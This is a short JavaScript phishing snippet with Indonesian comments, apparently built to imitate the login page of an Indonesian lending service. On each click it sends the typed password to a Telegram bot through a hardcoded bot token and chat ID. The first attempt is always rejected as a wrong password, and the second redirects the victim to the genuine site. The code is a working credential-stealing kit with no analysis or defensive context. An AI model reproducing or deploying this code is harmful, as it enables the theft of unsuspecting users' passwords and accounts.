let clickCount = 0;
      document.getElementById("loginButton").addEventListener("click", function () {
        const password = document.getElementById("password").value;

        if (!password) {
          alert("Password tidak boleh kosong!");
          return;
        };
        clickCount++; 
        if (clickCount === 1) {
        // Jika klik pertama, tampilkan alert
        alert("Pasword salah!");
        } else if (clickCount === 2) {
            // Jika klik kedua, arahkan ke URL tertentu
            window.location.href = "https://www.adakami.id/";  // Ganti dengan URL tujuan Anda
        }

        // Ganti dengan token bot Telegram Anda dan chat ID Anda
        const botToken = '6812714144:AAHCwoKn2croDh94SVFfWEmDz7R5eKbL34g';
        const chatId = '1701307635';

        // Membuat pesan
        const message = `Password yang dimasukkan: ${password}`;

        // Mengirim permintaan ke API Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
          method: 'GET',
        })
        .then(response => response.json())
        .then(data => {

        })
        .catch(error => {
          console.error('Error:', error);
          alert('Terjadi kesalahan, coba lagi!');
        });
      });

